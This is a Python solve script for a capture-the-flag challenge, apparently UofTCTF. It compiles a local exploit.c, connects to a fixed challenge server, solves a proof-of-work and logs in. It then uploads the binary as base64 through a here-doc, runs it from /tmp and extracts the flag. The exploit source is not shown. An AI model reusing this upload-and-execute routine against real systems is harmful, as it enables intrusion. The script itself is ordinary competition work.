import base64
import os
import re
import socket
import subprocess
import sys
import time
import secrets


HOST = "34.26.243.6"
PORT = 5000

POW_SOLVER = "/tmp/redpwnpow-linux-amd64"
ZIG = "/tmp/zig/zig"


class Sock:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buf = bytearray()
        self.sock.settimeout(1.0)

    def _recv_some(self) -> bytes:
        return self.sock.recv(4096)

    def read_until(self, marker: bytes, timeout: float) -> bytes:
        end = time.time() + timeout
        while time.time() < end:
            idx = self.buf.find(marker)
            if idx != -1:
                idx_end = idx + len(marker)
                out = bytes(self.buf[:idx_end])
                del self.buf[:idx_end]
                return out
            try:
                chunk = self._recv_some()
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf += chunk
        return bytes(self.buf)

    def read_until_any(self, markers: list[bytes], timeout: float) -> tuple[bytes, bytes | None]:
        end = time.time() + timeout
        while time.time() < end:
            for m in markers:
                idx = self.buf.find(m)
                if idx != -1:
                    idx_end = idx + len(m)
                    out = bytes(self.buf[:idx_end])
                    del self.buf[:idx_end]
                    return out, m
            try:
                chunk = self._recv_some()
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf += chunk
        return bytes(self.buf), None

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)


def compile_exploit() -> str:
    out = os.path.abspath("solve/exp")
    subprocess.check_call(
        [
            ZIG,
            "cc",
            "-O2",
            "-static",
            "-target",
            "x86_64-linux-musl",
            "-s",
            "-o",
            out,
            "exploit.c",
        ]
    )
    return out


def solve_pow(banner: str) -> str:
    m = re.search(r"sh -s (s\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+)", banner)
    if not m:
        raise RuntimeError("pow challenge not found")
    chal = m.group(1)
    sol = subprocess.check_output([POW_SOLVER, chal]).decode().strip()
    return sol


def run():
    bin_path = compile_exploit()
    payload_b64 = base64.b64encode(open(bin_path, "rb").read()).decode()

    raw = socket.create_connection((HOST, PORT), timeout=10)
    s = Sock(raw)
    banner = s.read_until(b"solution: ", timeout=10).decode("utf-8", "replace")
    sol = solve_pow(banner)
    s.send((sol + "\n").encode())

    s.read_until(b"login: ", timeout=180)
    s.send(b"ctf\n")
    s.read_until_any([b"$ ", b"# "], timeout=30)

    # Make interactive scripting quieter/robust.
    # - Disable local echo so we don't get base64 spam.
    # - Disable PS2 so here-doc doesn't print '> ' prompts.
    ready_mark = f"__READY_{secrets.token_hex(8)}__"
    s.send(f"stty -echo; export PS2=''; echo {ready_mark}\n".encode())
    s.read_until(ready_mark.encode(), timeout=30)

    upload_mark = f"__UPLOAD_{secrets.token_hex(8)}__"
    s.send(b"cat > /tmp/exp.b64 <<'EOF'\n")
    for i in range(0, len(payload_b64), 768):
        s.send((payload_b64[i : i + 768] + "\n").encode())
    s.send(
        (
            "EOF\n"
            "base64 -d /tmp/exp.b64 > /tmp/exp && chmod +x /tmp/exp\n"
            f"echo {upload_mark}\n"
        ).encode()
    )
    s.read_until(upload_mark.encode(), timeout=180)

    run_mark = f"__RUN_{secrets.token_hex(8)}__"
    s.send(f"/tmp/exp 2>&1; echo {run_mark}\n".encode())
    out = s.read_until(run_mark.encode(), timeout=600)

    s.send(b"stty echo\n")
    s.read_until_any([b"$ ", b"# "], timeout=30)
    txt = out.decode("utf-8", "replace")
    m = re.search(r"uoftctf\{[^}]+\}", txt)
    if m:
        print(m.group(0))
    else:
        sys.stdout.write(f"[no flag] bytes={len(out)}\\n")
        sys.stdout.write(txt)


if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)) + "/..")
    run()
